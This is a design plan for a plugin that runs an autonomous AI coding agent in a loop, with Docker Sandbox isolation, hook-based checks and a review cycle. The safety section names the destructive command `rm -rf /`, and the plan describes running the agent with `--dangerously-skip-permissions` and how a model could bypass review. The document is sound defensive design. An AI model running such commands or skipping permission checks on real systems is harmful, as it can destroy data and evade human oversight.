# Ralph Loop Development Workflow — Implementation Plan

## Context

The Ralph Loop is an outer orchestration pattern that repeatedly invokes Claude Code CLI against file-based specifications. Each iteration gets a fresh context window, avoiding context rot. State persists on disk between iterations via progress files, task lists, and memory files. A bash script drives the loop.

This plan builds a **standalone `ralph` plugin** under `claude-code/plugins/ralph/`, separate from the `zaksak` plugin. This keeps the ralph workflow self-contained and independently installable via the marketplace. The design draws from the synthesized research in `research/ralph-loops/`. Key differentiators from reference implementations: **Docker Sandbox microVM isolation** as the primary safety mechanism (with a PreToolUse hook blocklist as fallback), explicit separation of loop-scoped vs repo-scoped memory, context-aware wrap-up guidance, self-managing task iteration, and a **structurally enforced iterative review cycle** where every task must pass a fresh-context review before it can be marked complete — preventing the "one-shot assumption" that plagues most Ralph loop implementations.

### Prerequisites

- **Claude Code CLI** installed on host
- **Docker Desktop 4.58+** with Sandboxes enabled (recommended for primary safety mode)
- `jq` (for task list verification in `ralph.sh`)
- macOS with Apple Silicon (primary target); Windows experimental, Linux legacy container mode
- If Docker is unavailable, the plugin falls back to a PreToolUse hook blocklist (see `pretooluse-hook-reference.md`)

---

## File Layout

New plugin at `claude-code/plugins/ralph/`:

```
claude-code/plugins/ralph/
├── .claude-plugin/
│   └── plugin.json                          # NEW: plugin manifest
├── hooks/
│   ├── hooks.json                           # NEW: plugin hook definitions
│   └── scripts/
│       ├── context_monitor.py              # NEW: PostToolUse context usage alerts
│       └── stop_loop_reminder.py            # NEW: Stop hook — tasks.json validation + enforce commit
├── sandbox/
│   └── setup.sh                             # NEW: auth symlink setup (run via `docker sandbox exec`)
├── scripts/
│   ├── ralph.sh                             # NEW: main loop runner (sandbox-aware)
│   ├── ralph-init.sh                        # NEW: initialize a ralph loop in a project
│   └── ralph-archive.sh                     # NEW: archive a completed loop
├── skills/
│   └── ralph-plan.md                        # NEW: interactive PRD + task list generation skill
└── templates/
    ├── prompt.md                            # NEW: per-iteration prompt template
    ├── prd-template.md                      # NEW: PRD scaffold (requirements context)
    ├── tasks-template.json                  # NEW: task list starter (execution state)
    └── progress-template.md                 # NEW: progress log starter
```

Also update the root `marketplace.json` to register the new plugin.

When a user runs `ralph-init.sh` in their target project, it creates:

```
target-project/
├── ralph/
│   ├── prd.md            # Requirements context (human-written, static during loop)
│   ├── tasks.json        # Task list / execution state (Claude-modified)
│   ├── progress.txt      # Append-only iteration log (loop-scoped memory)
│   └── prompt.md         # Iteration prompt (copied, customizable per-project)
└── .ralph-active          # Runtime marker (created by ralph.sh, gitignored)
```

---

## Components

### 1. Plugin Manifest

**File:** `claude-code/plugins/ralph/.claude-plugin/plugin.json`

```json
{
  "name": "ralph",
  "description": "Ralph Loop — autonomous agentic coding workflow with sandbox isolation, scoped memory, and self-managing task iteration",
  "version": "0.1.0",
  "hooks": "./hooks/hooks.json"
}
```

### 2. Marketplace Registration

**File:** `marketplace.json` (root) — add entry:

```json
{
  "name": "ralph",
  "source": "./claude-code/plugins/ralph",
  "description": "Ralph Loop — autonomous agentic coding workflow with sandbox isolation, scoped memory, and self-managing task iteration",
  "version": "0.1.0"
}
```

### 3. ralph.sh — Main Loop Runner

**File:** `claude-code/plugins/ralph/scripts/ralph.sh`

Core behavior:
- Iterates from 1 to `MAX_ITERATIONS` (default: 15), invoking Claude each time with the prompt template
- **Sandbox mode (default):** Uses the create + exec + run pattern (see below). The sandbox provides OS-level isolation; `--dangerously-skip-permissions` is applied by the sandbox template automatically
- **Direct mode (fallback):** Uses `claude -p "$PROMPT" --dangerously-skip-permissions` — relies on PreToolUse hook blocklist for safety (see `pretooluse-hook-reference.md`)
- Auto-detects Docker Sandbox availability at startup; falls back to direct mode if unavailable
- Each iteration is a fresh `claude -p` process = fresh context window (the sandbox itself persists across iterations — fast reconnect, no re-setup)
- Uses `sed` to inject `$RALPH_ITERATION` and `$RALPH_MAX_ITERATIONS` into the prompt before passing to Claude
- Creates `.ralph-active` marker file on start (JSON with timestamp, pid, max_iterations, mode, skipReview, reviewCap) — hooks check for this file to activate ralph-specific behavior and determine review configuration
- **Before each iteration**, reads `tasks.json` and writes a pre-iteration snapshot to `.ralph-active` (see §5b). This snapshot captures the review-critical fields (`passes`, `reviewStatus`, `reviewCount`) per story and the deterministically-detected iteration mode. The stop hook uses this to enforce legal state transitions, not just state invariants
- Determines iteration mode using the same deterministic priority the prompt uses: any `reviewStatus: "changes_requested"` → `review-fix`, else any `reviewStatus: "needs_review"` → `review`, else → `implement`
- Registers `trap` to clean up `.ralph-active` on EXIT/INT/TERM
- Detects completion via `<promise>COMPLETE</promise>` in output, then verifies with `jq` that all stories in `tasks.json` have `passes: true` AND `reviewStatus: "approved"`
- Falls back to tasks.json-only check (if agent completed everything but forgot the tag) — requires both `passes: true` and `reviewStatus: "approved"` for all stories
- Streams output to terminal via `tee /dev/stderr` while capturing for promise detection
- In sandbox mode, adds a 2-3 second sleep between iterations to allow sandbox→host file sync to settle before reading `tasks.json` on the host
- Handles transient empty responses (exit 0 with no text output) by retrying the iteration, with a cap on retries
- Exits 0 on completion, 1 on max iterations reached

Sandbox invocation pattern (create + exec + run):

```bash
SANDBOX_NAME="ralph-$(echo "$PROJECT_DIR" | sed 's#[^A-Za-z0-9._-]#_#g')"

# One-time setup: create sandbox if it doesn't exist
if ! docker sandbox ls 2>/dev/null | grep -q "$SANDBOX_NAME"; then
  # Create with default claude-code template + auth state mount
  docker sandbox create --name "$SANDBOX_NAME" claude "$PROJECT_DIR" "$HOME/.dclaude_state"

  # Set up auth symlinks and git config inside the sandbox
  docker sandbox exec -u root "$SANDBOX_NAME" bash -c '
    STATE_DIR="/Users/'"$USER"'/.dclaude_state"
    rm -rf /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
    ln -s "$STATE_DIR/.claude" /home/agent/.claude
    ln -s "$STATE_DIR/.claude.json" /home/agent/.claude.json
    chown -h agent:agent /home/agent/.claude /home/agent/.claude.json 2>/dev/null || true
  '
  docker sandbox exec "$SANDBOX_NAME" bash -c '
    git config --global user.email "ralph@localhost"
    git config --global user.name "Ralph Loop"
  '
fi

# Every iteration
docker sandbox run "$SANDBOX_NAME" -- -p "$PROMPT"
```

**Why create + exec + run instead of a custom Dockerfile template:** Docker Sandbox VMs have a separate image store from the host Docker daemon. Locally-built images (`docker build -t dclaude:latest`) are not accessible to the sandbox VM — `--pull-template never` does not help. The `exec` approach uses the stock `docker/sandbox-templates:claude-code` image (pulled from Docker Hub) and customizes the live VM. See `sandbox-test-results.md` Step 6 for full details.

**File sync constraint:** Once Mutagen has synced a file into the sandbox, host-side overwrites of that file are permanently ignored. This does not affect the default loop (sandbox writes files, host only reads), but matters for manual intervention. `ralph.sh` handles two scenarios:

1. **Resume after pause (developer edited files on host):** `ralph.sh` detects the pause and runs `docker sandbox stop` + restart before the next iteration. This forces Mutagen to re-snapshot the host filesystem, picking up all edits made in VS Code or any editor. Overhead is ~10s (one-time per resume). The developer workflow is: pause → edit files normally → resume. No special tooling required. See `docker-sandbox-isolation.md` "File sync" caveat for the full pattern.

2. **Programmatic host→sandbox writes (feedback injection between iterations):** Use `docker sandbox exec` to write directly into the sandbox, bypassing the sync layer entirely.

See `sandbox-test-results.md` Step 4 for the full root cause analysis, follow-up tests, and workaround matrix.

`.ralph-active` payload (updated before each iteration):
```json
{
  "timestamp": "2025-06-15T10:30:00Z",
  "pid": 12345,
  "max_iterations": 15,
  "mode": "sandbox",
  "skipReview": false,
  "reviewCap": 5,
  "iterationMode": "implement",
  "preIterationSnapshot": {
    "US-001": { "passes": false, "reviewStatus": null, "reviewCount": 0 },
    "US-002": { "passes": true, "reviewStatus": "approved", "reviewCount": 1 }
  }
}
```

The `iterationMode` and `preIterationSnapshot` fields are written by `ralph.sh` before each Claude invocation. Since `ralph.sh` is trusted code (not model-controlled), the snapshot cannot be manipulated by the model. The stop hook compares the current `tasks.json` against this snapshot to enforce legal state transitions per mode (see §5b Check 2.5).

Arguments:
```
ralph.sh [OPTIONS]
  -n, --max-iterations N    Max loop iterations (default: 15)
  --ralph-dir PATH           Path to ralph/ directory (default: ./ralph)
  -d, --project-dir PATH    Project root (default: cwd)
  -m, --model MODEL         Claude model to use (e.g., opus, sonnet)
  --sandbox                  Force Docker Sandbox mode (error if unavailable)
  --no-sandbox               Force direct mode with PreToolUse hook blocklist
  --skip-review              Disable the fresh-context review cycle; implementation
                             iterations set passes=true directly (original behavior).
                             Useful for low-stakes tasks where speed > review quality
  --review-cap N             Max fresh-context reviews per story (default: 5).
                             After N reviews, auto-approve with informational notes
  -h, --help                Show usage
```

Dependencies: `jq` (for tasks.json verification), `claude` CLI. Docker Desktop 4.58+ recommended for sandbox mode.

### 4. Safety Isolation — Docker Sandbox

**Primary safety mechanism.** Instead of a PreToolUse hook that pattern-matches dangerous commands (bypassable via encoding, variable expansion, subshells), Ralph runs Claude inside a Docker Sandbox microVM that provides hypervisor-level isolation. Even `rm -rf /` only destroys the sandbox filesystem. Network exfiltration is blocked by the sandbox's built-in proxy with domain allowlisting.

See `docker-sandbox-isolation.md` for full setup, architecture diagram, network policy configuration, and known caveats.

**Sandbox setup:**

- **`sandbox/setup.sh`** — Shell script that sets up auth symlinks and git config inside the sandbox VM. Run once via `docker sandbox exec -u root` after `docker sandbox create`. Symlinks `~/.dclaude_state/.claude/` into the sandbox `agent` user's home so credentials persist across sandbox destruction and recreation without mounting `~/.claude` directly.

**Note:** The original plan used a custom Dockerfile template (`sandbox/Dockerfile` + `sandbox/entrypoint.sh`). Feasibility testing found that Docker Sandbox VMs cannot access locally-built images — the `--pull-template never -t dclaude:latest` approach fails with "pull access denied". The working approach is to use the stock `docker/sandbox-templates:claude-code` template and customize via `docker sandbox exec`. See `sandbox-test-results.md` Step 6.

**Auth state initialization:** `~/.dclaude_state/.claude.json` must contain valid JSON (`{}` minimum). Using `touch` to create an empty file causes JSON parse errors on sandbox startup. Use `echo '{}' > ~/.dclaude_state/.claude.json`.

**Fallback:** When Docker Sandbox is unavailable (no Docker Desktop, Linux CI, etc.), `ralph.sh` runs Claude directly with `--dangerously-skip-permissions` and relies on a PreToolUse hook blocklist for safety. The hook script and full pattern reference are documented in `pretooluse-hook-reference.md`.

### 5. Hook Scripts

**File:** `claude-code/plugins/ralph/hooks/hooks.json`

Wires two hooks across two events (PostToolUse, Stop), plus a SessionStart cleanup. All hook scripts are written in Python for consistency, robust JSON handling (no `jq` dependency), and cleaner tasks.json validation logic. These hooks run inside the Docker Sandbox when sandbox mode is active.

#### 5a. Context Monitor (Always-on, graduated alerts)

**File:** `hooks/scripts/context_monitor.py`
**Event:** `PostToolUse`, matcher: `.*`
**Always active** — fires after every tool call

Estimates context usage by parsing the session transcript file (available via `transcript_path` in hook stdin JSON). Uses a `FILE_SIZE / 4` chars-per-token heuristic against a 200k token window (configurable via `CLAUDE_CONTEXT_WINDOW` env var).

Fires graduated alerts at 5 thresholds — each threshold triggers only once per session:

| Threshold | Severity | Message                                                                                        |
| --------- | -------- | ---------------------------------------------------------------------------------------------- |
| 50%, 60%  | NOTICE   | "Be mindful of remaining space. Plan to finish your current task within this session. If you discover follow-up work, add new stories to tasks.json — the next iteration will pick them up." |
| 70%, 80%  | WARNING  | "Finish your current task and commit soon. Do not start additional tasks. If work remains, create new stories in tasks.json for the next iteration and capture any implementation details or insights in progress.txt so the next iteration has full context." |
| 90%       | CRITICAL | "Wrap up immediately. Do NOT start new work. Instead: (1) create tasks in tasks.json for any remaining work, (2) write implementation details, insights, and handoff notes to progress.txt, (3) commit all changes, (4) stop. The next iteration will continue from where you left off." |

**State tracking:** Uses `/tmp/claude-context-alerts-${SESSION_ID}` to record which thresholds have already fired. Each threshold fires once, then is suppressed for the rest of the session.

**Session cleanup:** A `SessionStart` hook (inline command in hooks.json) removes the state file at the start of each new session so thresholds re-arm.

**Output:** Returns JSON with `hookSpecificOutput.additionalContext` containing the alert message, which gets injected into Claude's context.

**Tuning:** If alerts fire too early, increase the chars-per-token divisor to 5–6. If too late, decrease to 3. After compaction the transcript file is not truncated, so estimates may run high post-compaction — this is conservative (alerts earlier, not later).

#### 5b. End-of-Loop Stop Reminder (Ralph-only)

**File:** `hooks/scripts/stop_loop_reminder.py`
**Event:** `Stop`
**Conditionally active:** only when `.ralph-active` exists

Runs three checks before allowing Claude to stop. All must pass or the stop is blocked:

**Check 1: Task list schema validation** — Validates `ralph/tasks.json` structure:
- File exists and is valid JSON
- Required top-level fields: `project`, `branchName`, `description`, `userStories` (array)
- Every story has required fields: `id` (string), `title` (string), `passes` (boolean), `priority` (number), `acceptanceCriteria` (non-empty array), `reviewStatus` (null or one of `"needs_review"`, `"changes_requested"`, `"approved"`), `reviewCount` (non-negative integer), `reviewFeedback` (string)
- `id` values are unique (no duplicates)
- No story has `passes: true` with an empty `notes` field (enforce documentation of what was done)
- If validation fails → block with specific error describing which field/story is malformed

**Check 2: Review integrity enforcement (state invariants)** — Validates that the current tasks.json satisfies review invariants. **Skipped entirely when `.ralph-active` contains `"skipReview": true`** (i.e., `--skip-review` mode).

When review mode is active:
- Every story with `passes: true` MUST have `reviewStatus: "approved"` — if any story has `passes: true` without `"approved"`, block with: `"Story {id} has passes=true but reviewStatus is '{reviewStatus}', not 'approved'. Only review iterations may approve stories. Set passes back to false or complete the review cycle."`
- Every story with `reviewStatus: "approved"` MUST have `passes: true` — these fields must be in sync
- No story may have `reviewStatus: "changes_requested"` with an empty `reviewFeedback` field — if review requested changes, it must explain what needs fixing
- `reviewCount` must be a non-negative integer and must not exceed the configured review cap + 1 (sanity check against corruption)

**Check 2.5: Transition validation (state transitions)** — The structural enforcement that the model only made mode-appropriate changes to review-critical fields. **Skipped entirely when `.ralph-active` contains `"skipReview": true`**. Requires `iterationMode` and `preIterationSnapshot` in `.ralph-active` (written by `ralph.sh` before each iteration — trusted code, not model-controlled).

Compares the current `tasks.json` against `preIterationSnapshot` for each story. For stories present in the snapshot, validates that `passes`, `reviewStatus`, and `reviewCount` only changed in ways permitted by the `iterationMode`:

| iterationMode | Allowed transitions per story | Block if |
|---|---|---|
| **`implement`** | `reviewStatus: null → "needs_review"` (at most one story). All other review fields unchanged. New stories allowed (must start at `passes: false`, `reviewStatus: null`, `reviewCount: 0`). | Any story: `passes: false → true`. Any story: `reviewStatus → "approved"`. Any `reviewCount` changed. Error: `"Implement iterations cannot set passes=true or approve stories. Only review iterations may approve. Story {id} had illegal transition: {field} {old} → {new}."` |
| **`review`** | Exactly one story: `reviewCount` incremented by 1. That story transitions to EITHER (a) `reviewStatus: "approved"` + `passes: true` OR (b) `reviewStatus: "changes_requested"` + non-empty `reviewFeedback`. No other story's `passes`/`reviewStatus`/`reviewCount` changed. | More than one story's review fields changed. `reviewCount` changed by != 1. Story approved without `reviewCount` increment. Other story's review fields modified. Error: `"Review iteration made illegal transition on story {id}: {details}."` |
| **`review-fix`** | One story: `reviewStatus: "changes_requested" → "needs_review"`, `reviewFeedback` cleared. `passes` stays `false`. `reviewCount` unchanged. No other story's review fields changed. | `passes` changed. `reviewStatus → "approved"`. `reviewCount` changed. Other story's review fields modified. Error: `"Review-fix iterations cannot approve stories. Story {id} must go back to needs_review for re-review. Illegal transition: {field} {old} → {new}."` |

Why both Check 2 and Check 2.5? Check 2 validates **end-state invariants** (e.g., `passes: true ↔ approved`). Check 2.5 validates **transitions** (e.g., only review iterations can *set* `passes: true`). Without Check 2.5, the model can satisfy all invariants while making illegal transitions — for example, an implementation iteration setting both `passes: true` and `reviewStatus: "approved"` simultaneously, completely bypassing the fresh-context review. Check 2 alone cannot catch this because the end-state is valid. Check 2.5 catches it because the *transition* from the snapshot state is illegal for the `implement` mode.

If `preIterationSnapshot` is missing from `.ralph-active` (e.g., older ralph.sh version), Check 2.5 is skipped with a warning but Check 2 still runs — graceful degradation to invariant-only enforcement.

**Check 3: Uncommitted changes** — Checks `git status --porcelain`:
- If uncommitted changes exist → block, telling Claude to:
  1. Update `ralph/progress.txt` with what was accomplished + learnings
  2. Consider if any lasting patterns belong in CLAUDE.md or `.claude/rules/`
  3. Commit ALL changes including progress.txt and tasks.json updates
- Claude must address the feedback and try stopping again

If all checks pass (valid schema + review invariants + legal transitions + no uncommitted changes), approves the stop.

### 6. Prompt Template

**File:** `claude-code/plugins/ralph/templates/prompt.md`

The prompt Claude receives each iteration. The prompt operates in **three modes** depending on the state of tasks.json. Mode detection happens in Step 2 and determines which Step 3 variant executes. This enables a structurally enforced review cycle: implementation iterations cannot mark a story as `passes: true` — only review iterations can, after a fresh-context evaluation. This is enforced at two levels: the stop hook validates both end-state invariants (Check 2) and mode-appropriate transitions against a pre-iteration snapshot (Check 2.5).

#### Iteration modes

| Mode | Trigger condition | Purpose |
| --- | --- | --- |
| **Implement** | Any story has `passes: false` AND `reviewStatus: null` | Normal implementation of a new story |
| **Review** | Any story has `reviewStatus: "needs_review"` | Fresh-context review of a previously implemented story |
| **Review-Fix** | Any story has `reviewStatus: "changes_requested"` | Fix issues identified by a prior review iteration |

Mode priority: **Review-Fix > Review > Implement**. This ensures review feedback is addressed before new reviews are attempted, and pending reviews are completed before new implementation begins.

#### Prompt structure

1. **Header** — Identifies this as Ralph Loop iteration N of M

2. **Step 1: Orient** — Read progress.txt (especially Codebase Patterns section at top), read prd.md for requirements context, read tasks.json for task state, check `git log` and `git status`

3. **Step 2: Select & Determine Mode** — Scan tasks.json and select the active story based on mode priority:

   - **Review-Fix mode:** Any story with `reviewStatus: "changes_requested"` → select it, read its `reviewFeedback` field for specific issues to address
   - **Review mode:** Any story with `reviewStatus: "needs_review"` → select it for fresh-context review
   - **Implement mode:** Highest-priority story where `passes: false` and `reviewStatus: null` (respecting `dependsOn`) → select it for implementation. If too large for the context window (~60% of context is usable working space), break it into sub-stories in tasks.json and work on the first one. Claude can also add new tasks, reorder priorities, or restructure the task list as needed.

4. **Step 3 (mode-dependent):**

   **Step 3-implement: Implement (Implement mode)**
   - Read existing code first, follow patterns from progress.txt Codebase Patterns section
   - Implement the selected story. Respect constraints from prd.md throughout
   - Run project verification commands (from `tasks.json.verifyCommands`)
   - Perform a **best-effort self-review** before committing:
     - Run `git diff` and read every changed line
     - Check each acceptance criterion — is it genuinely met?
     - Look for edge cases, error handling gaps, leftover TODOs
     - If issues found, fix them and re-run verifyCommands
   - This self-review is advisory (not structurally enforced) — it reduces work for the mandatory fresh-context review that follows

   **Step 3-review: Fresh-Context Review (Review mode)**
   - You are reviewing work from a PREVIOUS iteration. You did not write this code in this session. Review it as if reading someone else's work.
   - **Increment `reviewCount`** for this story (this tracks how many fresh-context reviews the story has been through)
   - Read the story's acceptance criteria from tasks.json
   - Run `git log --oneline -5` to see recent commits for this story
   - Run `git diff` against the appropriate commit range to see all changes for this story
   - For EACH acceptance criterion individually:
     - Find the specific code that implements it
     - Verify it actually works as intended, not just that it looks right
     - Check edge cases and error paths
   - Run verifyCommands to confirm automated checks still pass
   - **Decision:**
     - All criteria genuinely met, no issues → set `reviewStatus: "approved"` AND `passes: true`
     - Issues found AND `reviewCount` < review cap (default 5) → set `reviewStatus: "changes_requested"`, write specific actionable feedback to `reviewFeedback` describing exactly what needs to be fixed and where. Do NOT attempt to fix it yourself — the next iteration handles fixes in review-fix mode with a fresh context
     - Issues found BUT `reviewCount` >= review cap → **auto-approve**: set `reviewStatus: "approved"` AND `passes: true`. Write remaining concerns to `reviewFeedback` prefixed with `[AUTO-APPROVED AT CAP]` for the user's awareness. The rationale: if this many reviews haven't resolved the issue, it likely needs human input rather than another review cycle

   **Step 3-review-fix: Address Review Feedback (Review-Fix mode)**
   - Read `reviewFeedback` for the selected story — this contains specific issues from the review
   - Address each piece of feedback explicitly
   - Run verifyCommands after fixes
   - Perform the same best-effort self-review as in implement mode
   - Clear `reviewFeedback` and set `reviewStatus: "needs_review"` to trigger another fresh-context review

5. **Step 4: Document Progress** — Append structured entry to progress.txt (what was done, files changed, verification results, learnings). Include the iteration mode (implement/review/review-fix) in the entry header. Curate the Codebase Patterns section at the top with reusable discoveries

6. **Step 5: Consider Memory Updates** — Update CLAUDE.md or `.claude/rules/` ONLY for rules that persist beyond this ralph loop (e.g., "this project uses bun not npm"). Skip this step if nothing universal was learned

7. **Step 6: Commit & Signal** — Commit with mode-appropriate message:
   - Implement mode: `feat: [US-xxx] - [Title]` — set `reviewStatus: "needs_review"` (NOT `passes: true`)
   - Review mode (approved): `review: [US-xxx] - approved` — set `reviewStatus: "approved"` AND `passes: true`
   - Review mode (changes requested): `review: [US-xxx] - changes requested` — set `reviewStatus: "changes_requested"` with feedback
   - Review-Fix mode: `fix: [US-xxx] - address review feedback` — set `reviewStatus: "needs_review"` for re-review
   - After committing, check if ALL stories have `passes: true` AND `reviewStatus: "approved"` → output `<promise>COMPLETE</promise>`

**Skip-review mode behavior:** When `.ralph-active` contains `"skipReview": true`, the prompt operates in **Implement mode only**. Steps 3-review and 3-review-fix are never triggered. Implementation iterations set `passes: true` directly after verifyCommands pass (original pre-review behavior). `reviewStatus` remains `null`, `reviewCount` stays 0. The best-effort self-review in Step 3-implement still applies as an advisory quality check.

Hard rules embedded in the prompt:
- One story per iteration, never start a second
- **Implementation iterations NEVER set `passes: true`** — only review iterations can, and only when approving (unless `--skip-review` is active)
- Don't weaken tests to make them pass
- If stuck, document the blocker in progress.txt for the next iteration
- Claude may add/split/reorder stories in tasks.json as needed (self-management)
- prd.md is read-only — never modify the PRD during the loop
- Review iterations do not fix code — they evaluate and provide feedback. Mixing review and fix in the same context defeats the purpose of fresh-context review
- Review-fix iterations address ALL feedback items, not just the easy ones

#### Task lifecycle diagram

```
                    ┌─────────────────────────────────┐
                    │                                  │
                    ▼                                  │
  ┌──────────────────────┐                             │
  │ reviewStatus: null    │ ◄── initial state           │
  │ passes: false         │                             │
  │ reviewCount: 0        │                             │
  └──────────┬───────────┘                             │
             │ implement iteration                     │
             ▼                                         │
  ┌──────────────────────┐                             │
  │ reviewStatus:         │                             │
  │   "needs_review"     │                             │
  │ passes: false         │                             │
  └──────────┬───────────┘                             │
             │ review iteration (reviewCount++)        │
             ▼                                         │
        ┌─────────┐                                    │
        │ Verdict │                                    │
        └────┬────┘                                    │
             │                                         │
     ┌───────┼────────┐                                │
     ▼       │        ▼                                │
  approved   │   changes_requested                     │
     │       │        │                                │
     │       │        ▼                                │
     │       │  ┌──────────────────────┐               │
     │       │  │ reviewStatus:         │               │
     │       │  │  "changes_requested" │               │
     │       │  │ reviewFeedback: "..." │               │
     │       │  └──────────┬───────────┘               │
     │       │             │ review-fix iteration       │
     │       │             │                           │
     │       │             └───────────────────────────┘
     │       │
     │       └──► auto-approved (reviewCount >= cap)
     │                │
     ▼                ▼
  ┌────────────────────────┐
  │ passes: true            │
  │ reviewStatus: "approved"│
  │ reviewCount: N          │  ◄── N = total reviews for post-completion analytics
  └────────────────────────┘
     ✓ done
```

### 7. PRD Template

**File:** `claude-code/plugins/ralph/templates/prd-template.md`

The human-written requirements document that Claude reads each iteration for context. Adapted from the project's `docs/PRD_TEMPLATE.md`, stripped of execution-tracking sections (those live in tasks.json). Static during the loop — Claude reads but never modifies this file.

Sections (annotated with complexity tiers from S-Patch to L-Epic):

1. **Summary** _(Required, all tiers)_ — 2-4 sentences: what is being built, who it's for, expected outcome
2. **Problem Statement** _(Required, all tiers)_ — Current state, why it's a problem, what triggers this work
3. **Goals** _(Required M/L, Optional S)_ — 3-6 specific, measurable outcomes
4. **Non-Goals** _(Required M/L, Recommended S)_ — Explicit scope boundaries. The most important section for AI agents — prevents over-engineering and unrequested changes
5. **Background & Context** _(Recommended M/L)_ — Architecture overview, key file paths, existing patterns to follow, database schema context, terminology
6. **Technical Design** _(Required, all tiers)_ — Subsections as needed:
   - 6a. Database Changes (DDL, indexes, RLS)
   - 6b. API Contracts (method, path, request/response JSON, errors)
   - 6c. Core Logic Changes (pseudocode, step-by-step algorithms)
   - 6d. Frontend Changes (components, data flow, interaction flow)
   - 6e. Infrastructure / Config Changes
7. **Constraints** _(Recommended M/L)_ — Cross-cutting invariants that apply to ALL stories across every iteration. Rules Claude must respect regardless of which task is active:
   - Technical constraints ("All monetary values stored as NUMERIC(10,2), never floats")
   - Library/pattern mandates ("Use spatie/laravel-enum, not native PHP enums")
   - Integration rules ("All new endpoints must be idempotent")
   - Behavioral invariants ("Custom prices always take precedence over default prices")
8. **Edge Cases & Error Handling** _(Recommended M/L)_ — Scenario / Trigger / Expected Behavior / Error table
9. **Risks & Mitigations** _(Recommended M/L)_ — Risk / Likelihood / Impact / Mitigation table
10. **Open Questions** _(Recommended, all tiers)_ — Unresolved decisions; strikethrough + annotate when resolved

Template provides section headers with HTML comments explaining what to write. User deletes sections they don't need.

### 8. Tasks Template

**File:** `claude-code/plugins/ralph/templates/tasks-template.json`

The machine-readable execution state tracker. Claude reads and modifies this file each iteration to track story completion.

```json
{
  "project": "",
  "branchName": "ralph/feature-name",
  "description": "",
  "verifyCommands": [],
  "userStories": [
    {
      "id": "US-001",
      "title": "",
      "description": "",
      "acceptanceCriteria": [],
      "priority": 1,
      "passes": false,
      "reviewStatus": null,
      "reviewCount": 0,
      "reviewFeedback": "",
      "notes": "",
      "dependsOn": []
    }
  ]
}
```

Key fields:
- `verifyCommands`: project-specific checks Claude runs each iteration (tests, lint, typecheck)
- `dependsOn`: ordering constraints between stories
- `passes`: boolean, set to `true` ONLY by a review iteration after approval — never by an implementation iteration
- `reviewStatus`: tracks the review lifecycle for each story. Values:
  - `null` — not yet implemented
  - `"needs_review"` — implemented and committed, awaiting fresh-context review in the next iteration
  - `"changes_requested"` — review found issues; actionable feedback written to `reviewFeedback`
  - `"approved"` — fresh-context review passed; `passes` may now be set to `true`
- `reviewCount`: integer, incremented each time a review iteration evaluates this story (not incremented by review-fix iterations). Starts at 0. Used for two purposes: (1) enforcing a per-task review cap (default: 5) — when `reviewCount` reaches the cap, the review iteration must auto-approve regardless of remaining issues, noting concerns in `reviewFeedback` as informational rather than blocking. (2) post-completion analytics — after the PRD is done, the user can examine `reviewCount` across all stories to evaluate whether the review cycle is adding value (e.g., if most tasks approve at reviewCount=1, the overhead is minimal; if many reach 3-4, the reviews are catching real issues)
- `reviewFeedback`: when `reviewStatus` is `"changes_requested"`, contains specific, actionable feedback from the review iteration describing what needs to be fixed. Cleared when the story is re-submitted for review. When the review cap is reached and the story is auto-approved, contains informational notes about any remaining concerns (prefixed with `[AUTO-APPROVED AT CAP]`)
- `notes`: Claude appends implementation context for future iterations

**Review enforcement rule:** `passes: true` is only valid when `reviewStatus: "approved"`. This invariant is enforced at two levels by the stop hook (see §5b): Check 2 validates the end-state invariant (`passes: true ↔ approved`), and Check 2.5 validates that the *transition* was legal for the current iteration mode (e.g., an implement iteration cannot set `passes: true` or `reviewStatus: "approved"` — only review iterations can). The transition check uses a pre-iteration snapshot written by `ralph.sh` (trusted code) to `.ralph-active`, making it impossible for the model to bypass the review cycle by satisfying invariants through illegal transitions.

**Review cap rule:** When `reviewCount` reaches the configured cap (default: 5), the review iteration must approve the story even if minor issues remain. The rationale: if 5 fresh-context reviews haven't resolved an issue, further reviews are unlikely to help — the issue is either genuinely hard (needs human input) or subjective (the reviewer keeps finding new things to nitpick). The cap prevents infinite review-fix loops while the `reviewCount` data lets the user evaluate whether to adjust the cap up or down for future PRDs.

**Skip-review mode:** When `ralph.sh` is invoked with `--skip-review`, the `.ralph-active` marker includes `"skipReview": true`. In this mode, implementation iterations set `passes: true` directly (the original pre-review behavior), `reviewStatus` remains `null`, `reviewCount` stays 0, and the stop hook skips review integrity enforcement. This is for low-stakes tasks where speed matters more than review quality.

**Separation of concerns:** prd.md provides the *context* (what, why, constraints, technical design). tasks.json provides the *execution state* (stories, completion, priority). The PRD is the specification; the task list is the checklist.

### 9. Progress Template

**File:** `claude-code/plugins/ralph/templates/progress-template.md`

```markdown
# Ralph Progress Log
Started: {{DATE}}
PRD: {{PROJECT_NAME}}

## Codebase Patterns
- (Reusable patterns discovered during this loop)

---
```

Append-only after the `---`. The Codebase Patterns section at the top is curated (edited, not just appended) as the loop progresses.

### 10. Utility Scripts

#### ralph-init.sh

**File:** `claude-code/plugins/ralph/scripts/ralph-init.sh`

Usage: `ralph-init.sh [--project-dir PATH] [--name FEATURE_NAME]`

What it does:
1. Creates `ralph/` directory in the target project
2. Copies template files (prompt.md, prd-template.md → prd.md, tasks-template.json → tasks.json, progress-template.md → progress.txt)
3. Substitutes `{{DATE}}` and `{{PROJECT_NAME}}` in progress.txt
4. Sets `branchName` in tasks.json to `ralph/<name>` if `--name` provided
5. Adds `.ralph-active` to `.gitignore` if not already there
6. Prints next-steps instructions

#### ralph-archive.sh

**File:** `claude-code/plugins/ralph/scripts/ralph-archive.sh`

Usage: `ralph-archive.sh [--project-dir PATH] [--label LABEL]`

What it does:
1. Creates `ralph-archive/<date>-<branch-or-label>/`
2. Moves prd.md, tasks.json, and progress.txt to archive
3. Generates a `summary.md` (stories completed vs total, date range)
4. Resets `ralph/` to clean state with fresh templates
5. Commits the archive

### 11. ralph-plan Skill

**File:** `claude-code/plugins/ralph/skills/ralph-plan.md`

A user-invocable skill (`/ralph-plan`) that interactively generates `prd.md` and `tasks.json`. Adapts based on whether `ralph/prd.md` already has content.

**Mode 1 — Full planning** (prd.md is empty or template scaffold):
1. Ask the user clarifying questions — as many as needed until the requirements are clear. No fixed limit. Focus on: problem/goal, core functionality, scope boundaries, technical context, constraints, success criteria. Continue asking until confident the specification is complete.
2. Generate `ralph/prd.md` with all relevant sections filled in (following the PRD template structure)
3. Derive `ralph/tasks.json` — break requirements into right-sized stories (each completable in one iteration/context window), set dependency ordering via `dependsOn`, write verifiable acceptance criteria, include `verifyCommands`. All stories start with `passes: false`, `reviewStatus: null`, `reviewCount: 0`, and empty `reviewFeedback`
4. Present both files for user review

